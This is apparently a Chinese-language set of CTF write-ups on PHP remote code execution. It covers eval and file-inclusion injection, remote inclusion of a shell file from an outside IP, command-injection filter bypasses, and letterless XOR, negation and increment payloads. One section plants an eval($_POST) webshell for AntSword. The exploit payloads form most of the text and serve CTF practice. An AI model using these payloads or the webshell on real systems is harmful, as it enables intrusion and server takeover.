# CTFHUB
## eval执行
源码
```php
<?php  
if (isset($_REQUEST['cmd'])) {  
    eval($_REQUEST["cmd"]);  
} else {    highlight_file(__FILE__);  
}  
?>
```
因为eval是代码执行函数所以发送post请求或get请求`cmd=system('ls /');`再`?cmd=system('cat /flag_24683');`
## 文件包含
源码index.php
```php
<?php  
error_reporting(0);  
if (isset($_GET['file'])) {  
    if (!strpos($_GET["file"], "flag")) {  
        include $_GET["file"];  
    } else {  
        echo "Hacker!!!";  
    }  
} else {    highlight_file(__FILE__);  
}  
?>
```
shell.txt
```
<?php eval($_REQUEST['ctfhub']);?>
```
要传入一个不含`flag`的file参数，包含在index.php里，所以payload  `?file=shell.txt&ctfhub=system('cat /flag');`
## php://input
界面有一个phpinfo，可以看环境变量，看到![](/image/168.png)allow_url_fopen和allow_url_include都是on,由此确定php://input可以用，抓包将get请求改为post，只要![](/image/169.png)就得到flag了。
## 读取源代码
这一关直接用php://filter协议读取flag，`?file=php://filter/read=convert.base64-encode/resource=/flag`限制了只可以用php://伪协议。得到后base64解码得到flag。
## 远程包含
看环境变量可知`allow_url_fopen = On`  `allow_url_include = On`，可以执行远程包含。可以在服务器写一个shell.txt文件
```php
<?php
system('cat /flag');
?>
```
再`?file=http://121.89.81.39/shell.txt`这样就可以远程包含，得到flag。
## 命令注入
输入`127.0.0.1;ls`看到一个`196852280510721.php` ,再`127.0.0.1;cat 196852280510721.php`右键，flag藏在源码里。
## 过滤cat
这一关把cat过滤了，但是有许多指令都可以代替cat，
```
less/more/head/tail/nl/od/grep/tac
```
这里注意一下，如果用grep，需要`grep "ctfhub" flag_361590168416.php`表示搜索ctfhub并返回整行。od返回的是八进制数，要转换一下。
## 过滤空格
空格可以代替
```
<  , <>, +,%20,%09，$IFS$9,${IFS},$IFS,$IFS$1,%0a %a0
```
## 过滤目录分隔符
先`127.0.0.1;ls` 发现有一个文件`flag_is_here` 再`127.0.0.1;ls flag_is_here` 下面就有flag文件，但是`/`过滤了，cat不了，就用`127.0.0.1;cd flag_is_here && cat flag_64481074720294.php` 中`command1 && command2`表示如果命令1执行成功就执行命令2
## 过滤运算符
这一关把`|&`都过滤了，可以用`;`代替`|`，`127.0.0.1;cat flag_84251269421497.php`得到flag
## 综合过滤练习
这一关把`|;& cat flag 空格 ctfhub`都过滤了，用`%0a`换行符可以代替`|;`，`127.0.0.1%0als`看到`flag_is_here`再，flag被过滤了可以用`\`转义，`127.0.0.1%0als${IFS}fl\ag_is_here`看到`flag_166306963619.php`，再`127.0.0.1%0acd${IFS}fl\ag_is_here%0atac${IFS}fl\ag_166306963619.php`得到flag。还有另一种解法`127.0.0.1%0acd${IFS}%09*_is_here%0atac${IFS}%09*_166306963619.php`就是用`%09*`代替flag，`%09`是Tab键，可以自动补齐。
# 无字母RCE
## BUUCTF hardrce(取反)
看源码
```php
<?php  
header("Content-Type:text/html;charset=utf-8");  
error_reporting(0);  
highlight_file(__FILE__);  
if(isset($_GET['wllm']))  
{    $wllm = $_GET['wllm'];    $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];  
    foreach ($blacklist as $blackitem)  
    {  
        if (preg_match('/' . $blackitem . '/m', $wllm)) {  
        die("LTLT说不能用这些奇奇怪怪的符号哦！");  
    }}  
if(preg_match('/[a-zA-Z]/is',$wllm))  
{  
    die("Ra's Al Ghul说不能用字母哦！");  
}  
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";  
eval($wllm);  
}  
else  
{  
    echo "蔡总说：注意审题！！！";  
}  
?>
```
把字母都禁止了，^和反引号被过滤了，所以不可以用异或和或运算了，但是`~`没有过滤，可以用取反。
```php
<?php
echo urlencode(~'system');
echo '   ';
echo urlencode(~'ls /');
```
得到取反后的字符`%8C%86%8C%8B%9A%92   %93%8C%DF%D0`,payload
```
(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);
```

```php
<?php
echo urlencode(~'cat /flllllaaaaaaggggggg');
```
得到`%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98`
payload
```
(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);
```
# 无字母数字RCE
## 异或
源码
```php 
<?php
highlight_file(__FILE__);    
$code = $_GET['code'];
if(preg_match("/[A-Za-z0-9]+/",$code)){
die("hacker!");
} 
@eval($code);
```
因为字母数字都过滤了，这就需要异或了，
```
'!' ^ '@' = 'a'
'"' ^ '@' = 'b'
'#' ^ '@' = 'c'
'$' ^ '@' = 'd'
'%' ^ '@' = 'e'
'&' ^ '@' = 'f'
'\'' ^ '@' = 'g'
'(' ^ '@' = 'h'
')' ^ '@' = 'i'
'*' ^ '@' = 'j'
'+' ^ '@' = 'k'
',' ^ '@' = 'l'
'-' ^ '@' = 'm'
'.' ^ '@' = 'n'
'/' ^ '@' = 'o'
'[' ^ '+' = 'p'
';' ^ '*' = 'q'
'[' ^ ')' = 'r'
'^' ^ '-' = 's'
'[' ^ '/' = 't'
'?' ^ '.' = 'u'
'[' ^ '-' = 'v'
'\\' ^ '+' = 'w'
']' ^ '%' = 'x'
'^' ^ '\'' = 'y'
'_' ^ '%' = 'z'
```
当然这样一个一个字母拼有点麻烦，可以用一个python脚本一步到位，
```python
valid = "!@$%^*(){}[];\'\",.<>/?-=_`~ "  
#valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "  
answer = str(input("请输入进行异或构造的字符串："))  
  
tmp1, tmp2 = '', ''  
for c in answer:  
  for i in valid:  
    for j in valid:  
      if (ord(i) ^ ord(j) == ord(c)):  
        tmp1 += i  
        tmp2 += j  
        break  
    else:  
      continue  
    breakprint("tmp1为:",tmp1)  
print("tmp2为:",tmp2)
```
这样就可以知道`"!^^@^^"^"@--%,*"`就是assert，`"}/(*"^"-`{~"`就是POST，
```php
$_="!^^@^^"^"@--%,*";
$__='_'.("}/(*"^"-`{~");
$___=$$__;
$_($___[_]);

```
因为有一些特殊字符，所以要url编码
```
?code=$_="!^^@^^"^"@--%,*";$__='_'.("}/(*"^"-`{~");$___=$$__;$_($___[_]);//拼接为assert($_POST[_]);
最终payload
?code=%24_%3D%22!%5E%5E%40%5E%5E%22%5E%22%40--%25%2C*%22%3B%24__%3D'_'.(%22%7D%2F(*%22%5E%22-%60%7B~%22)%3B%24___%3D%24%24__%3B%24_(%24___%5B_%5D)%3B
```
这些传到get参数，再传一个post参数，`_=phpinfo();`就可以执行命令了。
## 自增
`$_++`对_变量进行了自增操作,由于我们没有定义_的值,PHP会给_赋一个默认值`NULL==0`,**由此我们可以看出,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字**
```
"A"++ ==> "B"
"B"++ ==> "C"
```
也就是说，如果我们能够得到"A"，那么我们就能通过自增自减，得到所有的字母。 那么问题就转化为怎么得到一个字符"A"。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为"Array"。再取这个字符串的第一个字母，就可以获得"A"。
```php
<?php
$_=[].'';//得到Array
$___=$_[$__];//得到"A"，$__没有定义，默认为False也即0，此时$___="A"
$__=$___;//$__="A"
$_=$__;//$_="A"
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__;//'AS'
$___.=$__;//'ASS'
$__=$_;//'A'
$__++;$__++;$__++;$__++;
$___.=$__;//'ASSE'
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__;//'ASSER'
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__;//得到ASSERT
$____="_";
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$____.=$__;
$_=$$____;
$___($_[_]);
```
### `[SWPUCTF 2021 新生赛]hardrce_3`
源码
```php
<?php  
header("Content-Type:text/html;charset=utf-8");  
error_reporting(0);  
highlight_file(__FILE__);  
if(isset($_GET['wllm']))  
{    $wllm = $_GET['wllm'];    $blacklist = [' ','\^','\~','\|'];  
    foreach ($blacklist as $blackitem)  
    {  
        if (preg_match('/' . $blackitem . '/m', $wllm)) {  
        die("小伙子只会异或和取反？不好意思哦LTLT说不能用！！");  
    }}  
if(preg_match('/[a-zA-Z0-9]/is',$wllm))  
{  
    die("Ra'sAlGhul说用字母数字是没有灵魂的！");  
}  
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";  
eval($wllm);  
}  
else  
{  
    echo "蔡总说：注意审题！！！";  
}  
?>
```
payload
```
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```
还得url加密，
post
```
_=phpinfo();
```
可以执行。
可以利用这个写一个一句话木马
```php
file_put_contents('1.php','<?php eval($_POST[cmd]);phpinfo();?>')
```
这样后连接蚁剑就行了。
## 无参RCE
```php
<?php  
highlight_file(__FILE__);  
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {      
    eval($_GET['code']);  
}  
?>
```
这个只能匹配形如`a(b(c()))`的函数形式的。
**解释**：
- `/[^\W]+`匹配不在下列列表中的单字符，`+`量词，匹配一到无穷次，贪婪匹配。
- `\w`匹配字母数字和下划线
- `\(`按字面匹配字符`(`
- `\)`按字面匹配字符`)`
- `(?R)?`递归引用整个表达式。
- `?`匹配0-1次。
**无参函数**：
- `getallheaders()` 这个函数的内容就是获取http所有的头部信息。接着我们可以用var_dump函数来把函数的执行结果都打印出来。(有局限性，只有apache可以用)
- 试一下`?code=var_dump(getallheaders());`但会出现报错，`Fatal error**: Call to undefined function getallheaders() in`好像不能用。应该是PHP5不能用，换成PHP7就可以执行了。会输出一个一维数组，包含http头信息。
- `end()`是取出数组的最后一位。这个end函数是只会取出最后一位的键值，就是以字符串的形式输出出来，所以键名是可以随便起的。
- `?code=var_dump(end(getallheaders()));`就可以输出最后一个键值`string(14) "localhost:6543"`
- 如果修改请求头,![](/image/171.png)发现bp是倒着来的，只有放最上面才是最后一个，这样如果将var_dump改为eval就可以命令执行了。![](/image/172.png)
- `session_id()`把恶意代码写在cookie的session_id里面。然后就用session_id()这个函数来读取它，然后它会返回出一个字符串，再用eval函数执行命令。要先session_start()。
- `var_dump(session_id(session_start()));`出来的是字符串phpsessid。可以将字符串进行16进制编码后再用php中的hex2bin函数解码，执行恶意命令。
- 用`eval(hex2bin(session_id(session_start())));`来解码后执行![](/image/170.png)
- `get_defined_vars()`可以替代`getallheaders()`原理差不多，这个函数获取四个全局变量，`$_GET $_POST $_FILES $_COOKIE`他返回的是一个二维数组，可以用current()变为一维数组，再用end(),这样也可以命令执行`?code=eval(end(current(get_defined_vars())));&666=phpinfo();`![](/image/173.png)
- `localeconv()`函数返回一个包含本地数字及货币格式信息的数组。他返回一个二维数组，第一位是一个点。可以用current()函数取出来，点可以用来遍历目录。点在linux中代表当前目录。`?code=var_dump(scandir(current(localeconv())));`![](/image/174.png)
- `scandir()`列出目录中的文件和目录。
- `current()`和`pos()`作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：
- `end()`指向最后一个元素，并输出
- `next()`指向下一个元素，并输出
- `prev()`指向上一个元素，并输出
- `reset()`指向数组中第一个元素，并输出
- `each()`返回当前元素的键名和键值，并将内部指针向前移动
- `chdir()`chdir('..')来跳回上一级目录。再配合scandir函数遍历任意目录下的文件。利用操作数组的函数将内部指针移到我们想要的目录上然后直接用`chdir`切就好了
- `array_reverse()`将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个`next()`
- `highlight_file()`用来高亮文件内容，用来读取文件。
- `dirname()`这个函数返回路径中的目录名称部分。可以`var_dump(current(localeconv()));`得到一个点后，想要得到两个点读取上一级目录。`dirname(".") → ".."`应该是版本问题，我的返回还是一个点
- `getcwd()`这个函数返回当前工作目录。成功则返回当前工作目录，失败则返回FALSE。也需要用scandir函数遍历当前工作目录。可以结合dirname()读取上一级目录。
- `var_dump(scandir(dirname(getcwd())));`先getcwd()得到当前目录，再`dirname()`得到上一级目录，`scandir()`就可以看到了，这样可以读取任意文件。
## `[GXYCTF 2019]禁止套娃`
用dirsearch扫了一下，发现许多git文件，应该是git泄露。
得到源码
```php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```
et被禁了，不可以用`getallheaders()`,`bin hex`被禁了，不可以用`session_id()`了，值可以用`localeconv()`了。
- `?exp=var_dump(scandir(current(localeconv())));`得到当前目录，`array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) ".git" [3]=> string(8) "flag.php" [4]=> string(9) "index.php" }`
- 先反转一下在指向下一个就是flag.php，最后`highlight_file()`输出内容。
- payload`?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));`得到flag